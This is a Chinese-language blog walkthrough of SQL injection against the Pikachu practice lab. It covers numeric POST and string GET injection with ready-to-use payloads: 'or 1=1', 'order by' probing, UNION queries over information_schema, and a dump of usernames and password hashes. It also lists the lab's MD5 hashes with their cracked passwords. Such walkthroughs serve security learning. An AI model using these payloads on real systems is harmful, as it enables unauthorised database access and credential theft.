---
title: Pikachu--SQL注入(一)
tags:
  - pikachu
categories:
  - 学习
  - web安全
  - Pikachu
abbrlink: 22ddbd5a
date: 2022-05-06 19:20:43
---



## 概述

>  在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。

一个严重的SQL注入漏洞，可能会直接导致一家公司破产！
SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。

## QLS注入攻击总体思路

1.  寻找SQL注入位置
2.  判断服务器类型和后台数据类型
3.  针对不同的服务器和数据库特点进行SQL注入攻击



## 步骤

### 数字型注入（post）

首先打开burp抓包，发现时post方法

![1](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190944.png)

#### 方法一：利用burp改包

`````
id=1 or 1=1#		
`````

可以看到，页面将所有id的信息返回了，可知存在数字型注入。



![2](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190948.png)

```
id=1' 					 报错，可判断存在SQL注入
```



![3](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190951.png)

确定回显字段

```
id=1 order by 3			报错
```



![4](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191206.png)

```
id=1 order by 2 		存在两个回显，字段数为2
```

![5](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191211.png)



```
id=1 union select 1,2		判断回显点，可以在1和2这两处位置，获得我们想要的信息
```

![6](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191213.png)



查询数据库名称

```
id=1 union select user(),database() 	 用户名为root@locallhost，数据库为pikachu
```



![7](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191216.png)



查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind

```
id=1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='pikachu'
```



![8](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191218.png)



```
id=1 union select 1, group_concat(table_name) from information_schema.tables where table_schema=database()#
```

![9](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191221.png)

查询user下所有表名

```
id=1 union select 1, group_concat(column_name) from information_schema.columns where table_name='users'#    
```

![10](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191223.png)





```
id=1 union select 1, group_concat(column_name) from information_schema.columns where table_schema=database()#      
```

![11](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191226.png)





查询字段username和password的内容

```
id=1 union select group_concat(username),group_concat(password) from users
```

![12](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191229.png)



#### 方法二、利用harbar

（Todo代办）



对应账号和MD5加密的密码：

admin：e10adc3949ba59abbe56e057f20f883e（123456）

pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）

test：e99a18c428cb38d5f260853678922e03（abc123）



### 字符型注入（get）

输入： 

```
select id,email from member where username='' or 1=1-- q'
或
?name=%27&submit=查询     %27  == '  get
```

![13](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191233.png)



也可以直接在url中的name参数后进行修改

```
name=%27&submit=查询				报错，判断存在SQL注入
```

![14](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191236.png)



查询出所有账户数据

```
' or 1=1-- q			
```

![15](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191238.png)



确定回显字段

```
' order by 3 -- q		报错
```

![16](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191240.png)

```
' order by 2 -- q				有两个回显
```

![17](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191243.png)

```
' union select 1,2 -- q				判断回显点
```

![18](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191246.png)

```
' union select user(),database() -- q		可知用户名为root@localhost，数据库名为pikachu
```

![19](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191249.png)



查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind

```
' union select 1,group_concat(table_name) from information_schema.tables where table_schema='pikachu' -- q
```

![20](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191256.png)

查询user下所有表明 user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password

```
' union select 1, group_concat(column_name) from information_schema.columns where table_name='users' -- q
```

![21](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191259.png)

查询字段username和password的内容

```
' union select group_concat(username),group_concat(password) from users -- q
```

![22](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191303.png)









---

参考链接： 

无垠安全：https://www.wuyini.cn/952.html

Pikachu靶场通关之SQL注入 - FreeBuf网络安全行业门户：https://www.freebuf.com/articles/web/254079.html
